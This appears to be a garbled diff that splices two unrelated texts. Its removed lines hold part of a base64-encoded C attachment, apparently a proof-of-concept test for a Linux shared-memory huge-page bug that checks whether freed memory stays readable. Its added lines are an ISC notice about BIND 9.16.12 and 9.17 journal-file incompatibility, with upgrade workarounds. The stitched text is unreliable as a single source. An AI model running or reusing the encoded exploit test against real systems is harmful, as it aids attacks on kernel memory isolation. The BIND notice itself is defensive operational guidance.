-Z2FjdGlvbiIpOw0KCQlleGl0KDEpOw0KCX0NCglwcmludGYoInN0YXJ0aW5n
-IHRlc3RcbiIpOw0KcmV0cnk6DQoJaWYgKHNpZ3NldGptcChtYXJrLCAwKSA9
-PSAtMSkgew0KCQlzaWdwcm9jbWFzayhTSUdfVU5CTE9DSywgJm1hc2ssIE5V
-TEwpOw0KCQlpZiAoKyt0cmllcyA+PSBOX1RSSUVTKSB7DQoJCQlwcmludGYo
-Im5vdCB2dWxuZXJhYmxlXG4iKTsNCgkJCWdvdG8gb3V0Ow0KCQl9DQoJfQ0K
-DQoJd2hpbGUgKCpjaGFuICE9IDApOw0KDQoJYWRkciA9ICh1bnNpZ25lZCBs
-b25nKWZyZWVfcCArIChQVURfU0laRSAtIDEpICYgUFVEX01BU0s7DQoNCglz
-aG1mbGcgPSBJUENfQ1JFQVR8MDY2NnxTSE1fSFVHRVRMQnwoMjEgPDwgU0hN
-X0hVR0VfU0hJRlQpOw0KDQoJLy8gQ3JlYXRlIHR3byBzaGFyZWQgcmVnaW9u
-cw0KCWZvciAoaSA9IDA7IGkgPCAyOyBpKyspIHsNCgkJc2htX2lkW2ldID0g
-c2htZ2V0KHNobV9rZXksIEFMTE9DX1NJWkUsIHNobWZsZyk7DQoJCWlmIChz
-aG1faWRbaV0gPCAwKSB7DQoJCQlwZXJyb3IoInNobWdldCIpOw0KCQkJZ290
-byBlcnI7DQoJCX0NCgkJcFtpXSA9ICh2b2xhdGlsZSB1bnNpZ25lZCBsb25n
-KilzaG1hdChzaG1faWRbaV0sICh2b2lkICopYWRkciwgMCk7DQoNCgkJaWYg
-KHBbaV0gPT0gKHZvaWQgKiktMSkgew0KCQkJcGVycm9yKCJzaG1hdCIpOw0K
-CQkJZ290byBlcnI7DQoJCX0NCgkJLy8gZmF1bHQgaXQgaW4NCgkJKnBbaV0g
-PSAwOw0KDQoJCXNobWZsZyAmPSB+SVBDX0NSRUFUOw0KCQlhZGRyICs9IFBV
-RF9TSVpFOw0KCX0NCg0KCWZvciAoaSA9IDA7IGkgPCAyOyBpKyspIHsNCgkJ
-ciA9IHNobWR0KCh2b2lkICopcFtpXSk7DQoJCWlmIChyICE9IDApIHsNCgkJ
-CXBlcnJvcigic2htZHQiKTsNCgkJCWdvdG8gZXJyOw0KCQl9DQoJCWlmIChz
-aG1faWRbaV0gPj0gMCkNCgkJCXNobWN0bChzaG1faWRbaV0sIElQQ19STUlE
-LCBOVUxMKTsNCgkJc2htX2lkW2ldID0gLTE7DQoJfQ0KDQoJKmNoYW4gPSAx
-Ow0KDQoJZm9yICh2b2xhdGlsZSBpbnQgaSA9IDA7IGkgPCAxMDAwMDAwMDA7
-IGkrKykgew0KCQlpZiAoKHYgPSAqcFswXSkgIT0gMCkNCgkJCWJyZWFrOw0K
-CX0NCg0KCXByaW50ZigiYWNjZXNzIHN1Y2NlZWRlZCBvbiBhdHRlbXB0ICgl
-ZCkgd2hlbiBpdCBzaG91bGQgZmFpbGVkLCByZWFkaW5nOiAlbHhcbiIsIHRy
-aWVzLCB2KTsNCglnb3RvIG91dDsNCmVycjoNCglwcmludGYoInVuZXhwZWN0
-ZWQgZXJyb3JcbiIpOw0KDQoJZm9yIChpID0gMDsgaSA8IDI7IGkrKykgew0K
-CQlpZiAoc2htX2lkW2ldID49IDApDQoJCQlzaG1jdGwoc2htX2lkW2ldLCBJ
-UENfUk1JRCwgTlVMTCk7DQoJCXNobV9pZFtpXSA9IC0xOw0KCX0NCm91dDoN
-CgkqY2hhbiA9IDEwMDsNCglyZXR1cm4gMDsNCn0NCg==
+If you already HAVE distributed packages based on BIND 9.16.12 -- we are
+really sorry, and here is what you will need to know.
 
---_002_EF0C4A7072684894A0061540CD68CB45vmwarecom_--
+Cathy Almond
+(for ISC Security Officer)
+
+-----
+
+Operational Notification: Zone journal (.jnl) file incompatibility
+after upgrading to BIND 9.16.12 and 9.17
+
+Posting date:        19 February 2021
+Program impacted:    BIND
+Versions affected:   BIND 9.16.12, BIND 9.16.12-S1 (Supported Preview
+                     Edition) and versions 9.17.0 -> 9.17.10 of the 9.17
+                     development branch.
+
+Description:
+
+   All changes made to a zone using dynamic updates or inbound
+   incremental zone update (IXFR) are stored in the zone's journal file.
+   This journal (.jnl) file is automatically created and maintained by
+   named, and will be used when named is re-started after a shutdown or
+   crash to roll-forward (replay) any zone updates that were not yet in
+   the version of the zone on disk when named stopped. A zone's journal
+   file is also used to provide incremental updates (IXFRs) to other
+   servers. DNSSEC-signed zones using inline-signing will also have
+   journal files associated with the signed version of the zone.
+
+   In BIND 9.17.0, we introduced the max-ixfr-ratio option, which is a
+   percentage representing the ratio of IXFR size to the size of the
+   entire zone. This sets the size threshold (expressed as a percentage
+   of the size of the full zone) beyond which named chooses to use an
+   AXFR response rather than IXFR when answering zone transfer requests.
+   This feature has now been back-ported to BIND 9.16, making its debut
+   in the 9.16.12 releases.
+
+   Unfortunately, one feature of this change escaped our notice, both
+   when writing the release documentation for BIND 9.17.0, and then
+   later on, adding the max-ixfr-ratio option to BIND 9.16.12. A small
+   change was required to the format of the journal (.jnl) file format
+   in order to support the calculation of an IXFR size during its
+   preparation. The old format .jnl file is incompatible with the
+   versions of BIND that support the new max-ixfr-ratio option.
+
+   When BIND is upgraded to 9.16.12, 9.16.12-S1 or 9.17 (any version)
+   and then started with journal (.jnl) files present that were created
+   by earlier versions, then the zone load will fail because the journal
+   roll-forward step will not recognise the older format.
+
+Impact:
+
+   This problem can affect BIND servers whose authoritative zones are
+   maintained via dynamic updates, or by editing the zone file and
+   reloading on a server with option 'ixfr-from-differences' enabled.
+   Secondary zones that are maintained using incremental updates (IXFR)
+   are similarly at risk. The 'ixfr-from-differences' option may also be
+   used in some environments to generate journal files following an
+   inbound AXFR.
+
+Workarounds:
+
+   We do not have a tool available to convert the journal files to the
+   new format, therefore on upgrading, it is necessary to start named
+   with the old format journal files removed.
+
+   (Options if you have not yet upgraded:)
+
+   1.  Before upgrading, ensure that named is stopped using rndc stop.
+   This will ensure that all zones are written to disk during the
+   shutdown processing. After named has stopped, delete or relocate all
+   the associated .jnl files so that they are not accessed when named is
+   restarted. named will generate new .jnl files as needed.
+
+   Warning: Do not stop named using rndc halt before upgrading
+   --
+     Using rndc halt instead of rndc stop will stop the server
+     immediately.  Recent changes made through dynamic update or
+     IXFR are not saved to the zone files on disk first (and will
+     need to be rolled-forward from the journal files when named is
+     restarted; this is what you need to prevent so that you can
+     delete them before upgrading).
+   --
+
+   2.  For a provisioning/primary authoritative server, you have another
+   option for ensuring that the zones are written to disk and that the
+   journal files are removed. First, ensure that all dynamic updates are
+   paused, then issue command:
+
+      rndc sync -clean
+
+   Then stop named as normal (you should not need to remove the .jnl
+   files manually as the 'rndc sync -clean' will have taken care of this
+   step).
+
+   (Options if you have already upgraded:)
+
+   3.  If named was stopped before you upgraded using rndc stop and you
+   know that this completed successfully, then removing or relocating
+   the .jnl files will be all that you need to do.
+
+   4.  If you are not sure if your zone files on disk were updated when
+   you stopped named and you have a large number of zones to recover,
+   then it may be easiest to back-out the update, start named to do the
+   roll-forward and load, and then shutdown again (rndc stop) before
+   following option 1. above.
+
+   5.  If you have only a small number of zones to recover, then you may
+   prefer to recover (or build) named-checkzone from your pre-upgrade
+   version of BIND and use that to regenerate the zone files from
+   the .jnl files.
+
+   For example, to create a new zone file 'example.com.new' for zone
+   'example.com' by rolling forward from 'example.com.jnl' and
+   'example.com', you would type:
+
+      named-checkzone -jD -o example.com.new example.com example.com
+
+   And then you would:
+
+   - remove files 'example.com.jnl' and 'example.com'
+   - rename 'example.com.new' to 'example.com'.
+
+   Note: Use -f and -F options if your zone files are not in text
+   format. BIND supports several formats of zone file - check which
+   format you need first.
+
+   Hint: Make backup copies of the zone and .jnl files before you run
+   named-compilezone.  The named-checkzone utility, when run with the
+   -jD  options, will apply the journal file changes to the zone and
+   then delete it afterwards. If you make a mistake with the options,
+   you may want to start again; having a backup copy in that situation
+   is essential!
+
+Solution:
+
+   Code changes to support roll-forward from the older format of .jnl
+   files are planned for the March 2021 maintenance releases (due
+   17 March 2021) but until then the measures suggested in the
+   "Workarounds" section should prevent or resolve post-upgrade zone
+   loading problems for Authoritative BIND server operators.
+
+Do you still have questions?
+Questions regarding this notification should go to security-
+officer@isc.org. To report a new issue, please encrypt your message
+using security-officer@isc.org's PGP key which can be found here:
+https://www.isc.org/pgpkey/. If you are unable to use encrypted email,
+you may also report new issues at: https://www.isc.org/reportbug/.
+
+Note:
+
+   ISC patches only currently supported versions. When possible we
+   indicate EOL versions affected. (For current information on which
+   versions are actively supported, please see:
+   https://www.isc.org/download/.)
+
+ISC Security Vulnerability Disclosure Policy:
+
+   Details of our current security advisory policy and practice can be
+   found in the ISC Software Defect and Security Vulnerability
+   Disclosure Policy at https://kb.isc.org/docs/aa-00861.
+
+This Knowledgebase article, found at
+https://kb.isc.org/v1/docs/operational-notification-zone-journal-jnl-file-i=
+ncompatibility-after-upgrading-to-bind-91612-and-917
+is the complete and official
+operational notification document.
+
+Legal Disclaimer:
+
+   Internet Systems Consortium (ISC) is providing this notice on an "AS
+   IS" basis. No warranty or guarantee of any kind is expressed in this
+   notice and none should be implied. ISC expressly excludes and
+   disclaims any warranties regarding this notice or materials referred
+   to in this notice, including, without limitation, any implied
+   warranty of merchantability, fitness for a particular purpose,
+   absence of hidden defects, or of non-infringement. Your use or
+   reliance on this notice or materials referred to in this notice is at
+   your own risk. ISC may change this notice at any time. A stand-alone
+   copy or paraphrase of the text of this document that omits the
+   document URL is an uncontrolled copy. Uncontrolled copies may lack
+   important information, be out of date, or contain factual errors.
